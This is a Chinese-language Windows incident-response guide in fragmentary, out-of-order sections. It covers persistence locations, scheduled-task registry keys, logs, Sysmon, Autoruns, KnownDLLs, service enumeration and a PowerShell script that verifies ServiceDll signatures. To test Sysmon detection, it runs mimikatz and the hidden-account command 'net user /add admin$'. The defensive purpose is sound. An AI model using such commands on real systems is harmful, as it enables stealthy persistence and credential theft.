`win + r` 输入

 `shell:Common Startup

```

一般具体路径如下：

 `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp

```
 该目录下存在的程序会在用户登录时，以登录用户的权限自动执行程序

【 Windows Server 2016 】 默认情况

### 2) 计划任务中任务的注册表

`计划任务的 Id、Index、SD 在此位置
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree

计划任务的具体配置在此位置
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{id}

```
 `Tree` 下为计划任务位置，其中包含计划任务的 `Id、Index、SD`

 - Id：这个值表示计划任务树中特定任务的唯一标识符。每个计划任务都有一个唯一的 ID，用于标识和区分不同的任务。
 - Index：这个值指示任务在计划任务树中的索引位置。它表示任务在树中的相对位置，可以用来确定任务的顺序或层次关系。
 - 不过实际上测试发现 `Index` 值很奇怪，以 `0x3` 为主，括号里面的值就是前面的值的十进制值

 - SD：这个值存储了任务的安全描述符（Security Descriptor）。安全描述符定义了对任务的访问权限和安全设置，包括哪些用户或组有权访问、更改或删除任务。

 得到 `Id` 值后，就可以在下面的注册表中查看具体该计划任务具体配置

 `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\

```

可以通过搜索来找到对应的计划任务配置

 - Actions：这个项存储了任务的操作（Actions）。它包含了任务执行时要执行的操作的详细信息，例如要运行的程序或脚本以及相关的参数。
 - Author：这个项表示任务的作者或创建者。它记录了任务创建时的作者信息。
 - Date：这个项表示任务的日期。它记录了任务的创建或修改日期。
 - DynamicInfo：这个项存储了任务的动态信息（Dynamic Information）。它可能包含任务最近执行的状态、结果或其他与任务执行相关的信息。
 - Hash：这个项存储了任务的哈希值（Hash）。哈希值是根据任务的属性和内容计算得出的唯一标识符，用于验证任务的完整性和一致性。
 - Path：这个项表示任务的路径。它记录了任务所在的文件路径或注册表路径。
 - Schema：这个项存储了任务的架构（Schema）。它定义了任务的结构和属性，包括触发器、操作和其他相关信息。
 - Triggers：这个项存储了任务的触发器（Triggers）。它包含了触发任务执行的条件和设置，例如计划时间、事件触发或系统状态变化等。
 - URI：这个项表示任务的统一资源标识符（URI）。它是一个唯一的标识符，用于标识任务的位置或资源。

 所以也就是说将该注册表中的内容都看一遍，就可以获取到所有的计划任务

 `reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows" "NT\CurrentVersion\Schedule\TaskCache\Tasks\

```

### 2) 查询指定用户正在运行中的进程

`tasklist /FI "USERNAME eq Administrator" /FI "STATUS eq running" /v

```

### 2) 查看进程之间的关联关系

`tlist -g                        # -g会列出所有进程及所关联的进程，会在进程前面标注[1234]，代表该进程是1234关联的进程，但是只能在win7以上系统使用
tilst -g 2796               # 列出指定pid进程的父进程[0]
tlist -g -t                 # 列出所有进程的进程树及关联的进程，-t为按照进程树列出，退格表示父子进程

```
 可以看到以下进程前面有 [0] ，是相关进程的父进程：

通过缩紧来表示进程关系，缩紧表示父子关系：

### 2. 日志文件

Windows Server 2016 的日志存储位置为

 `C:\Windows\System32\winevt\Logs\

```
 其中包含各种日志

安全日志系统默认存放位置：

 `C:\Windows\System32\winevt\Logs\Security.evtx

```

系统日志默认存放位置：

 `C:\Windows\System32\winevt\Logs\System.evtx

```

应用程序日志默认存放位置：

 `C:\Windows\System32\winevt\Logs\Application.evtx

```

### 2) 使用方法

在事件查看器中，找到：

事件查看器--> 应用程序和服务日志--> Microsoft--> Windows--> Sysmon--> Operational

当前模块下所有日志即为sysmon监控记录的日志，可以点击某条日志，在下面板查看日志详情内容。

### 2) 可执行文件、参数、启动类型

点击服务项后，右键选择属性 -> 常规

关注 可执行文件、启动参数、启动类型

启动类型有以下几种

 - 自动 (延迟启动)
 - 自动
 - 手动
 - 禁用

 自动（延迟启动）是介于自动启动和手动启动之间的一种选项。当一个服务被配置为自动（延迟启动）时，在系统启动时并不会立即启动该服务，而是会延迟一段时间后再启动。这个延迟时间是由操作系统进行动态调整的，以确保系统启动过程的平稳性和效率。

### 3. 查找隐藏账户

### 3. Amcache

Amcache跟踪已安装的应用程序、已执行（或当前）的程序、加载的驱动程序等。使这个工件与众不同的是，它还跟踪可执行文件和驱动程序的SHA1散列。（在Win7+中可用）

以下是Amcache的一些功能和用途：

 - 应用程序兼容性：Amcache记录了应用程序的元数据，包括应用程序的名称、版本、文件路径等信息。这些元数据可以用于识别和解决应用程序的兼容性问题。当应用程序启动时，Amcache会检查其元数据，并根据预定义的兼容性规则和设置来确定是否需要应用特定的兼容性修复。
 - 应用程序白名单：Amcache还用于应用程序白名单功能，这是一种安全机制，用于限制系统上可以运行的应用程序。管理员可以配置白名单，只允许特定的应用程序在系统上运行，其他应用程序则被阻止。Amcache记录了白名单中的应用程序信息，并与系统上运行的应用程序进行比对，以确定是否允许其运行。
 - 性能优化：Amcache还可以提高应用程序的启动性能。通过缓存应用程序的元数据和执行信息，系统可以更快地检索和加载应用程序，从而减少启动时间和响应延迟。

 Amcache数据存储在系统的Amcache.hve文件中，通常位于 `C:\Windows\AppCompat\Programs` 目录下。这个文件是一个二进制格式的注册表文件，包含了所有应用程序的元数据和执行信息。

txt 文件可以直接查看

解析工具

https://github.com/EricZimmerman/AmcacheParser

https://github.com/yoda66/GetAmCache/blob/master/Get-Amcache.ps1

 `AmcacheParser.exe  -f "C:\Windows\appcompat\Programs\Amcache.hve" --csv result

```

### 3. Autoruns

Autoruns 是由 Sysinternals（微软的一部分）提供的免费工具，它可以显示 Windows 启动时加载的所有程序、服务、驱动程序和其他自启动项。您可以从 Microsoft 官网下载并使用它。

https://learn.microsoft.com/zh-cn/sysinternals/downloads/autoruns

`Autoruns` 默认会监控上面提到的两个命名空间的绑定(`binding`)信息，可以右键进行删除

### 3) Autoruns

部分文章指出 `Autoruns` 删除 WMI 效果不好，其实这种表述是不严谨的

`Autoruns` 删除并不是将过滤器、消费者、绑定都删除，而是只删除消费者，经过测试发现，过滤器、消费者、绑定三者之一任何一个删除 `WMI` 事件订阅效果都会立即消失

所以 `Autoruns` 删除消费者是有效的，而且是一种相对合理的方式，因为如何直接将三者均删掉，可能过滤器和绑定原本就是运维人员需要的，只是消费者被篡改了，这样可以保护过滤器和绑定

所以应急响应过程中，确定好三者，不要着急删除

### 3. KnownDLLs

`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs

```
 这个注册表用于指定系统已知的DLL文件列表。

在该注册表项中，每个子项对应一个已知的DLL文件，并且以DLL文件的名称作为子项的名称。例如，如果有一个名为 `kernel32.dll` 的子项，那么该子项指示系统已知并信任 `kernel32.dll` 这个DLL文件。

该注册表项的目的是为了提高系统的安全性。当应用程序需要加载一个DLL文件时，系统会首先检查该DLL文件是否在 `KnownDLLs` 注册表项中。如果是，系统将直接从指定的位置加载该DLL文件，而不会去搜索路径或其他目录。

也可以通过 `Autoruns` 进行查看

【 Windows Server 2016 】默认情况

右键导出为 `reg` 结果如下

 `Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs]
"_Wow64"="Wow64.dll"
"_Wow64cpu"="Wow64cpu.dll"
"_Wow64win"="Wow64win.dll"
"advapi32"="advapi32.dll"
"clbcatq"="clbcatq.dll"
"combase"="combase.dll"
"COMDLG32"="COMDLG32.dll"
"coml2"="coml2.dll"
"DifxApi"="difxapi.dll"
"gdi32"="gdi32.dll"
"gdiplus"="gdiplus.dll"
"IMAGEHLP"="IMAGEHLP.dll"
"IMM32"="IMM32.dll"
"kernel32"="kernel32.dll"
"LPK"="LPK.dll"
"MSCTF"="MSCTF.dll"
"MSVCRT"="MSVCRT.dll"
"NORMALIZ"="NORMALIZ.dll"
"NSI"="NSI.dll"
"ole32"="ole32.dll"
"OLEAUT32"="OLEAUT32.dll"
"PSAPI"="PSAPI.DLL"
"rpcrt4"="rpcrt4.dll"
"sechost"="sechost.dll"
"Setupapi"="Setupapi.dll"
"SHELL32"="SHELL32.dll"
"SHLWAPI"="SHLWAPI.dll"
"user32"="user32.dll"
"WLDAP32"="WLDAP32.dll"
"WS2_32"="WS2_32.dll"

```
 应急响应过程中可以看看是否有缺少的

### 3) 根据pid查询进程

`tasklist /FI "PID eq 7768" /V

```

### 3. PowerShell

`Get-NetTCPConnection   # 获取 tcp 连接
Get-NetUDPEndpoint       # 获取 udp 连接

```

### 3. Powershell 查看环境变量

Powershell中输入：

 `ls env: | Format-Table -Wrap
$env:path -Split ";"        # 快速列出环境变量 path

```

【 Windows Server 2016 】 默认情况

`Administartor` 用户

 `Name                           Value
----                           -----
ALLUSERSPROFILE                C:\ProgramData
APPDATA                        C:\Users\Administrator\AppData\Roaming
CommonProgramFiles             C:\Program Files\Common Files
CommonProgramFiles(x86)        C:\Program Files (x86)\Common Files
CommonProgramW6432             C:\Program Files\Common Files
COMPUTERNAME                   WIN-2MTJ8IQ5VEA
ComSpec                        C:\Windows\system32\cmd.exe
HOMEDRIVE                      C:
HOMEPATH                       \Users\Administrator
LOCALAPPDATA                   C:\Users\Administrator\AppData\Local
LOGONSERVER                    \\WIN-2MTJ8IQ5VEA
NUMBER_OF_PROCESSORS           4
OS                             Windows_NT
Path                           C:\Program Files (x86)\Parallels\Parallels Tools\Applications;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\User
                               s\Administrator\AppData\Local\Microsoft\WindowsApps;
PATHEXT                        .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.CPL
PROCESSOR_ARCHITECTURE         AMD64
PROCESSOR_IDENTIFIER           Intel64 Family 6 Model 158 Stepping 13, GenuineIntel
PROCESSOR_LEVEL                6
PROCESSOR_REVISION             9e0d
ProgramData                    C:\ProgramData
ProgramFiles                   C:\Program Files
ProgramFiles(x86)              C:\Program Files (x86)
ProgramW6432                   C:\Program Files
PROMPT                         $P$G
PSModulePath                   C:\Users\Administrator\Documents\WindowsPowerShell\Modules;C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
PUBLIC                         C:\Users\Public
SESSIONNAME                    Console
SystemDrive                    C:
SystemRoot                     C:\Windows
TEMP                           C:\Users\ADMINI~1\AppData\Local\Temp
TMP                            C:\Users\ADMINI~1\AppData\Local\Temp
USERDOMAIN                     WIN-2MTJ8IQ5VEA
USERDOMAIN_ROAMINGPROFILE      WIN-2MTJ8IQ5VEA
USERNAME                       Administrator
USERPROFILE                    C:\Users\Administrator
windir                         C:\Windows

```

 `C:\Program Files (x86)\Parallels\Parallels Tools\Applications
C:\Windows\system32
C:\Windows
C:\Windows\System32\Wbem
C:\Windows\System32\WindowsPowerShell\v1.0\
C:\Users\Administrator\AppData\Local\Microsoft\WindowsApps

```

### 3. PowerShell

https://learn.microsoft.com/zh-cn/Powershell/scripting/samples/managing-services?view=Powershell-7.4

 `Get-Service

```
 直接执行会显示所有的服务

这个信息可以用来对比被害系统是否有哪些默认不存在的服务

【 Windows Server 2016 】默认情况

 `Status   Name               DisplayName
------   ----               -----------
Stopped  AJRouter           AllJoyn Router Service
Stopped  ALG                Application Layer Gateway Service
Stopped  AppIDSvc           Application Identity
Stopped  Appinfo            Application Information
Stopped  AppMgmt            Application Management
Stopped  AppReadiness       App Readiness
Stopped  AppVClient         Microsoft App-V Client
Stopped  AppXSvc            AppX Deployment Service (AppXSVC)
Stopped  AudioEndpointBu... Windows Audio Endpoint Builder
Stopped  Audiosrv           Windows Audio
Stopped  AxInstSV           ActiveX Installer (AxInstSV)
Running  BFE                Base Filtering Engine
Stopped  BITS               Background Intelligent Transfer Ser...
Running  BrokerInfrastru... Background Tasks Infrastructure Ser...
Stopped  Browser            Computer Browser
Stopped  bthserv            蓝牙支持服务
Stopped  CDPSvc             连接设备平台服务
Running  CDPUserSvc_448e2   CDPUserSvc_448e2
Stopped  CertPropSvc        Certificate Propagation
Stopped  ClipSVC            Client License Service (ClipSVC)
Running  COMSysApp          COM+ System Application
Running  CoreMessagingRe... CoreMessaging
Running  CryptSvc           Cryptographic Services
Stopped  CscService         Offline Files
Running  DcomLaunch         DCOM Server Process Launcher
Stopped  DcpSvc             DataCollectionPublishingService
Stopped  defragsvc          Optimize drives
Stopped  DeviceAssociati... Device Association Service
Stopped  DeviceInstall      Device Install Service
Stopped  DevQueryBroker     DevQuery Background Discovery Broker
Running  Dhcp               DHCP Client
Stopped  diagnosticshub.... Microsoft (R) 诊断中心标准收集器服务
Running  DiagTrack          Connected User Experiences and Tele...
Stopped  DmEnrollmentSvc    设备管理注册服务
Stopped  dmwappushservice   dmwappushsvc
Running  Dnscache           DNS Client
Stopped  dot3svc            Wired AutoConfig
Running  DPS                Diagnostic Policy Service
Stopped  DsmSvc             Device Setup Manager
Stopped  DsSvc              Data Sharing Service
Stopped  Eaphost            Extensible Authentication Protocol
Stopped  EFS                Encrypting File System (EFS)
Stopped  embeddedmode       嵌入模式
Stopped  EntAppSvc          Enterprise App Management Service
Running  EventLog           Windows Event Log
Running  EventSystem        COM+ Event System
Stopped  fdPHost            Function Discovery Provider Host
Stopped  FDResPub           Function Discovery Resource Publica...
Running  FontCache          Windows Font Cache Service
Stopped  FrameServer        Windows Camera Frame Server
Running  gpsvc              Group Policy Client
Stopped  hidserv            Human Interface Device Service
Stopped  HvHost             HV 主机服务
Stopped  icssvc             Windows 移动热点服务
Stopped  IKEEXT             IKE and AuthIP IPsec Keying Modules
Running  iphlpsvc           IP Helper
Running  KeyIso             CNG Key Isolation
Stopped  KPSSVC             KDC Proxy Server service (KPS)
Stopped  KtmRm              KtmRm for Distributed Transaction C...
Running  LanmanServer       Server
Running  LanmanWorkstation  Workstation
Stopped  lfsvc              Geolocation Service
Running  LicenseManager     Windows 许可证管理器服务
Stopped  lltdsvc            Link-Layer Topology Discovery Mapper
Running  lmhosts            TCP/IP NetBIOS Helper
Running  LSM                Local Session Manager
Stopped  MapsBroker         Downloaded Maps Manager
Running  MpsSvc             Windows Firewall
Running  MSDTC              Distributed Transaction Coordinator
Stopped  MSiSCSI            Microsoft iSCSI Initiator Service
Stopped  msiserver          Windows Installer
Stopped  NcaSvc             Network Connectivity Assistant
Running  NcbService         Network Connection Broker
Stopped  Netlogon           Netlogon
Stopped  Netman             Network Connections
Running  netprofm           Network List Service
Stopped  NetSetupSvc        Network Setup Service
Stopped  NetTcpPortSharing  Net.Tcp Port Sharing Service
Stopped  NgcCtnrSvc         Microsoft Passport Container
Stopped  NgcSvc             Microsoft Passport
Running  NlaSvc             Network Location Awareness
Running  nsi                Network Store Interface Service
Running  OneSyncSvc_448e2   同步主机_448e2
Running  Parallels Coher... Parallels Coherence Service
Running  Parallels Tools... Parallels Tools Service
Running  PcaSvc             Program Compatibility Assistant Ser...
Stopped  PerfHost           Performance Counter DLL Host
Stopped  PhoneSvc           Phone Service
Stopped  PimIndexMainten... Contact Data_448e2
Stopped  pla                Performance Logs & Alerts
Running  PlugPlay           Plug and Play
Stopped  PolicyAgent        IPsec Policy Agent
Running  Power              Power
Stopped  PrintNotify        Printer Extensions and Notifications
Running  PrlVssProvider     PrlVssProvider
Running  ProfSvc            User Profile Service
Stopped  QWAVE              Quality Windows Audio Video Experience
Stopped  RasAuto            Remote Access Auto Connection Manager
Stopped  RasMan             Remote Access Connection Manager
Stopped  RemoteAccess       Routing and Remote Access
Stopped  RemoteRegistry     Remote Registry
Stopped  RmSvc              无线电管理服务
Running  RpcEptMapper       RPC Endpoint Mapper
Stopped  RpcLocator         Remote Procedure Call (RPC) Locator
Running  RpcSs              Remote Procedure Call (RPC)
Stopped  RSoPProv           Resultant Set of Policy Provider
Stopped  sacsvr             Special Administration Console Helper
Running  SamSs              Security Accounts Manager
Stopped  SCardSvr           Smart Card
Stopped  ScDeviceEnum       Smart Card Device Enumeration Service
Running  Schedule           Task Scheduler
Stopped  SCPolicySvc        Smart Card Removal Policy
Stopped  seclogon           Secondary Logon
Running  SENS               System Event Notification Service
Stopped  SensorDataService  Sensor Data Service
Stopped  SensorService      Sensor Service
Stopped  SensrSvc           Sensor Monitoring Service
Stopped  SessionEnv         Remote Desktop Configuration
Stopped  SharedAccess       Internet Connection Sharing (ICS)
Running  ShellHWDetection   Shell Hardware Detection
Stopped  smphost            Microsoft Storage Spaces SMP
Stopped  SNMPTRAP           SNMP Trap
Running  Spooler            Print Spooler
Stopped  sppsvc             Software Protection
Running  SSDPSRV            SSDP Discovery
Stopped  SstpSvc            Secure Socket Tunneling Protocol Se...
Running  StateRepository    State Repository Service
Stopped  stisvc             Windows Image Acquisition (WIA)
Running  StorSvc            Storage Service
Stopped  svsvc              Spot Verifier
Stopped  swprv              Microsoft Software Shadow Copy Prov...
Stopped  SysMain            Superfetch
Running  SystemEventsBroker System Events Broker
Stopped  TabletInputService Touch Keyboard and Handwriting Pane...
Stopped  TapiSrv            Telephony
Stopped  TermService        Remote Desktop Services
Running  Themes             Themes
Stopped  TieringEngineSe... Storage Tiers Management
Running  tiledatamodelsvc   Tile Data model server
Running  TimeBrokerSvc      Time Broker
Running  TrkWks             Distributed Link Tracking Client
Stopped  TrustedInstaller   Windows Modules Installer
Stopped  tzautoupdate       自动时区更新程序
Running  UALSVC             User Access Logging Service
Stopped  UevAgentService    User Experience Virtualization Service
Stopped  UI0Detect          Interactive Services Detection
Stopped  UmRdpService       Remote Desktop Services UserMode Po...
Stopped  UnistoreSvc_448e2  User Data Storage_448e2
Stopped  upnphost           UPnP Device Host
Stopped  UserDataSvc_448e2  User Data Access_448e2
Running  UserManager        User Manager
Stopped  UsoSvc             Update Orchestrator Service for Win...
Running  VaultSvc           Credential Manager
Stopped  vds                Virtual Disk
Stopped  vmicguestinterface Hyper-V Guest Service Interface
Stopped  vmicheartbeat      Hyper-V Heartbeat Service
Stopped  vmickvpexchange    Hyper-V Data Exchange Service
Stopped  vmicrdv            Hyper-V 远程桌面虚拟化服务
Stopped  vmicshutdown       Hyper-V Guest Shutdown Service
Stopped  vmictimesync       Hyper-V Time Synchronization Service
Stopped  vmicvmsession      Hyper-V PowerShell Direct Service
Stopped  vmicvss            Hyper-V 卷影复制请求程序
Stopped  VSS                Volume Shadow Copy
Running  W32Time            Windows Time
Stopped  WalletService      WalletService
Stopped  WbioSrvc           Windows Biometric Service
Running  Wcmsvc             Windows Connection Manager
Stopped  WdiServiceHost     Diagnostic Service Host
Stopped  WdiSystemHost      Diagnostic System Host
Stopped  WdNisSvc           Windows Defender Network Inspection...
Stopped  Wecsvc             Windows Event Collector
Stopped  WEPHOSTSVC         Windows Encryption Provider Host Se...
Stopped  wercplsupport      Problem Reports and Solutions Contr...
Stopped  WerSvc             Windows Error Reporting Service
Stopped  WiaRpc             Still Image Acquisition Events
Running  WinDefend          Windows Defender Service
Running  WinHttpAutoProx... WinHTTP Web Proxy Auto-Discovery Se...
Running  Winmgmt            Windows Management Instrumentation
Running  WinRM              Windows Remote Management (WS-Manag...
Stopped  wisvc              Windows 预览体验服务
Stopped  wlidsvc            Microsoft Account Sign-in Assistant
Stopped  wmiApSrv           WMI Performance Adapter
Stopped  WPDBusEnum         Portable Device Enumerator Service
Running  WpnService         Windows 推送通知系统服务
Stopped  WpnUserService_... Windows 推送通知用户服务_448e2
Stopped  WSearch            Windows Search
Running  wuauserv           Windows Update
Running  wudfsvc            Windows Driver Foundation - User-mo...
Stopped  XblAuthManager     Xbox Live 身份验证管理器
Stopped  XblGameSave        Xbox Live 游戏保存

```
 `Powershell` 查询起来就很容易进行筛选了，可以使用以下命令查看可以显示和筛选的项

 `Get-Service | Get-Member

```

选择显示的内容(以名称、执行命令行、显示名字、启动类型为例)

 `Get-Service | Select Name, ExecuteCommand, DisplayName, StartType

```

如果想以其中一项作为筛选条件，可以通过以下格式进行，以服务名称为例

 `Get-Service -Name "ServiceName"| Select Name, ExecuteCommand, DisplayName, StartType

```

经过测试，发现这个命令在 `Windows Server 2016` 上并不能获取到启动执行参数

所以这里写了两个脚本，获取所有服务的信息以及获取指定某个服务的信息

获取所有的服务信息

 `$services = Get-WmiObject -Class Win32_Service

foreach ($service in $services) {
    $serviceName = $service.Name
    $displayName = $service.DisplayName
    $description = $service.Description
    $binaryPath = $service.PathName
    $startParameters = [System.IO.Path]::GetFileName($binaryPath) -replace '"', '' -split ' '
    $startType = $service.StartMode
    # $failureActions = $service.FailureActions
    # $dependencies = $service.Dependencies

    Write-Host "--------------------------"
    Write-Host "服务名称：$serviceName"
    Write-Host "显示名称：$displayName"
    Write-Host "描述：$description"
    Write-Host "可执行文件路径：$binaryPath"
    Write-Host "启动类型：$startType"
    Write-Host "启动参数："
    foreach ($parameter in $startParameters) {
        Write-Host "- $parameter"
    }
}

```

查询某个服务的信息

 `$serviceName = "ServiceName"
$service = Get-WmiObject -Class Win32_Service -Filter "Name='$serviceName'"

# $serviceName = $service.Name
$displayName = $service.DisplayName
$description = $service.Description
$binaryPath = $service.PathName
$startParameters = [System.IO.Path]::GetFileName($binaryPath) -replace '"', '' -split ' '
$startType = $service.StartMode
# $failureActions = $service.FailureActions
# $dependencies = $service.Dependencies

Write-Host "--------------------------"
Write-Host "服务名称：$serviceName"
Write-Host "显示名称：$displayName"
Write-Host "描述：$description"
Write-Host "可执行文件路径：$binaryPath"
Write-Host "启动类型：$startType"
Write-Host "启动参数："
foreach ($parameter in $startParameters) {
    Write-Host "- $parameter"
}

```

### 3) ServiceDll

服务启动部分是由 Windows 直接启动的，还有一部分是通过 `svchost.exe` 启动的

`svchost.exe` 是一个通用的 Windows 进程，用于托管和执行多个系统服务。它负责启动和管理在计算机上运行的许多服务。

以下是 `svchost.exe` 启动服务的工作原理：

 - 服务注册：每个服务都在注册表中的特定位置注册，指定了服务的名称、可执行文件路径和其他相关信息。
 - `svchost.exe` 根据注册表信息：当计算机启动时，操作系统读取注册表中的服务配置信息，并确定哪些服务需要由 `svchost.exe` 托管。
 - 创建 `svchost.exe` 进程：根据注册表中的配置信息，操作系统创建一个或多个 `svchost.exe` 进程，并为每个进程分配一个唯一的服务组标识。
 - 加载 DLL：每个 `svchost.exe` 进程根据其服务组标识加载相应的 DLL（动态链接库），这些 DLL 包含了实际的服务代码和逻辑。
 - 启动服务：`svchost.exe` 进程加载服务所需的 DLL 后，会启动和执行每个服务。每个服务在 `svchost.exe` 进程中以独立的线程运行。

 这么多服务要通过 `svchost.exe` 来启动，所以 `svchost.exe` 按照这些服务的特征将其进行了分组

 `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost

```

但是这里是不会直接记录组内成员的服务 `DLL` 的，这些 `DLL` 记录在哪里呢？

 `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\<servicename>\Parameters\

```
 在每个服务以上注册表位置的 `ServiceDll` 键对应的值

`Parametersv6` 键，它并不是一个固定的键，而是一种命名约定。`Parametersv6` 是用于区分不同版本的参数键，特别是在区分适用于 `IPv6` 的参数与适用于 `IPv4` 的参数时。

经过搜索，`Windows Server 2016` 中所有的默认服务注册表项只有 `Dhcp` 包含  `Parametersv6` ，所以就不做为查询特征了

所以这部分排查就是将所有服务注册表中包含 `Parameters` 子项的所有的 `ServiceDll` 中指定的可执行程序验证签名

还是通过 `Powershell` 进行排查

 `$microsoftCNS = @('Microsoft Corporation', 'Microsoft Windows', 'Microsoft Windows Hardware Compatibility Publisher', 'Microsoft Update', 'Microsoft Windows Publisher')

# 定义函数来进行签名校验
function Verify-FileSignature {
    param (
        [Parameter(Mandatory=$true)]
        [ValidateScript({Test-Path $_ -PathType Leaf})]
        [string]$FilePath
    )

    if (Test-Path -Path $FilePath -PathType Leaf) {
        $signature = Get-AuthenticodeSignature -FilePath $FilePath

        if ($signature.Status -eq 'Valid') {
            $publisher = $signature.SignerCertificate.Subject

            # 解析发布者信息以提取 CN 字段的值
            $cnValues = @(($publisher -split ', ' | Where-Object { $_ -like 'CN=*' }).Substring(3))

            if ($cnValues.Count -eq 1) {
                $cnValue = $cnValues[0]
                # Write-Output "CN 字段的值: $cnValue"

                # 判断 CN 字段是否为微软官方
                if ($microsoftCNS -contains $cnValue) {
                    # Write-Output "CN 字段值为微软官方。"
                    return "Valid"
                }
            }
        }

        return "Invalid"

    }

    return "File Not Found"

}

# 定义函数来检查注册表地址
function Check-RegistryPaths {
    param (
        [Parameter(Mandatory=$true)]
        [string[]]$RegistryPaths
    )

    $invalidSignatures = @()

    foreach ($registryPath in $RegistryPaths) {
        if (Test-Path -Path $registryPath) {
            $subkeys = Get-ChildItem -Path $registryPath
            foreach ($subkey in $subkeys) {
                $ParametersPath = Join-Path -Path $subkey.PSPath -ChildPath "Parameters"
                if (Test-Path -Path $ParametersPath) {
                    $libraryValue = (Get-ItemProperty -Path $ParametersPath -Name "ServiceDll" -ErrorAction SilentlyContinue)."ServiceDll"
                    if ($libraryValue) {
                        $binaryFilePath = $libraryValue.Trim().Trim('"')
                        $binaryFilePath = [Environment]::ExpandEnvironmentVariables($binaryFilePath)
                        if (Test-Path $binaryFilePath) {
                            $result = Verify-FileSignature -FilePath $binaryFilePath
                            if ($result -eq "Invalid") {
                                $invalidSignatures += @{
                                    RegistryPath = $subkey
                                    BinaryFilePath = $binaryFilePath
                                }
                                Write-Host "Signature is invalid for file: $binaryFilePath" -ForegroundColor Red
                            } elseif ($result -eq "Valid") {
                                Write-Host "Signature is valid for file: $binaryFilePath " -ForegroundColor Green
                            }
                        } else {
                            $dllFileName = Split-Path -Leaf $binaryFilePath
                            $found = $false
                            $searchPaths = @(
                                (Join-Path -Path $env:SystemRoot -ChildPath $dllFileName),
                                (Join-Path -Path $env:SystemRoot -ChildPath "System32\$dllFileName")
                            )
                            foreach ($path in $searchPaths) {
                                if (Test-Path $path) {
                                    $found = $true
                                    $result = Verify-FileSignature -FilePath $path
                                    if ($result -eq "Invalid") {
                                        $invalidSignatures += @{
                                            RegistryPath = $subkey
                                            BinaryFilePath = $path
                                        }
                                        Write-Host "Signature is invalid for file: $path" -ForegroundColor Red
                                    } elseif ($result -eq "Valid") {
                                        Write-Host "Signature is valid for file: $path " -ForegroundColor Green
                                    }
                                    break
                                }
                            }
                            if (-not $found) {
                                Write-Host "Could not find file '$dllFileName' in default search paths. Skipping signature verification."  -ForegroundColor Yellow
                            }
                        }
                    } else {
                        Write-Host "Binary file path is empty for subkey $($subkey.PSChildName)."  -ForegroundColor Yellow
                    }
                }
            }
        }
    }

    # 打印不通过的签名验证信息
    if ($invalidSignatures.Count -gt 0) {
        Write-Output ""
        Write-Output ""
        Write-Output "--------------------------------------------------------"
        Write-Host "Invalid signatures:" -ForegroundColor Red
        foreach ($invalidSignature in $invalidSignatures) {
            $registryPath = $invalidSignature.RegistryPath
            $binaryFilePath = $invalidSignature.BinaryFilePath
            Write-Host "Registry path: $registryPath" -ForegroundColor Yellow
            Write-Host "Binary file path: $binaryFilePath" -ForegroundColor Yellow
            Write-Output ""
        }
        Write-Output "--------------------------------------------------------"
    }
}

# 要检查的注册表地址数组
$registryPaths = @(
    "Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\"
)

# 调用函数进行检查
Write-Host "Starting signature verification..."

Check-RegistryPaths -RegistryPaths $registryPaths

Write-Host "Signature verification completed."

```

如果检测发现存在系统默认不存在的可执行文件或者 `DLL` ，需要与开发人员确认，并通过沙箱或者杀毒软件进行排查

【 Windows Server 2016 】默认情况

### 3) sysmon view可视化分析

在 sysmon 目录下管理员启动 cmd，输入如下命令，会在当前目录下生成 eventlog.xml 文件：

 `WEVTUtil query-events "Microsoft-Windows-Sysmon/Operational" /format:xml /e:sysmonview > eventlog.xml

```
 使用sysmon view工具导入eventlog.xml文件：

File--> Import Sysmon Event Logs

选择已经生成好的eventlog.xml文件，导入完成后即可看到所有运行程序及进程信息。

尝试使用mimikatz：

尝试使用net user /add admin$

同样可以抓取到具体进程和命令

筛选查看对应日志：

sysmon日志事件ID含义：

以下内容摘自官方文档

https://docs.microsoft.com/zh-cn/sysinternals/downloads/sysmon

事件ID 1：流程创建

流程创建事件提供有关新创建流程的扩展信息。完整的命令行提供了有关流程执行的上下文。ProcessGUID字段是整个域中此过程的唯一值，以简化事件关联。哈希是文件的完整哈希，其中包含HashType字段中的算法。

事件ID 2：一个进程更改了文件创建时间

当进程显式修改文件创建时间时，将注册更改文件创建时间事件。此事件有助于跟踪文件的实际创建时间。攻击者可能会更改后门的文件创建时间，以使其看起来像与操作系统一起安装。请注意，许多进程会合理地更改文件的创建时间。它不一定表示恶意活动。

事件ID 3：网络连接

网络连接事件记录计算机上的TCP / UDP连接。默认情况下禁用。每个连接都通过ProcessId和ProcessGUID字段链接到流程。该事件还包含源和目标主机名IP地址，端口号和IPv6状态。

事件ID 4：Sysmon服务状态已更改

服务状态更改事件报告Sysmon服务的状态（已启动或已停止）。

事件ID 5：进程终止

进程终止时报告进程终止事件。它提供了进程的UtcTime，ProcessGuid和ProcessId。

事件ID 6：驱动程序已加载

驱动程序加载事件提供有关在系统上加载驱动程序的信息。提供配置的哈希值以及签名信息。出于性能原因，签名是异步创建的，并指示在加载后是否删除了文件。

事件ID 7：图像已加载

图像加载事件记录在特定过程中加载模块的时间。默认情况下，此事件是禁用的，需要使用–l选项进行配置。它指示模块的加载过程，哈希和签名信息。出于性能原因，签名是异步创建的，并指示在加载后是否删除了文件。应仔细配置此事件，因为监视所有图像加载事件将生成大量事件。

事件ID 8：CreateRemoteThread

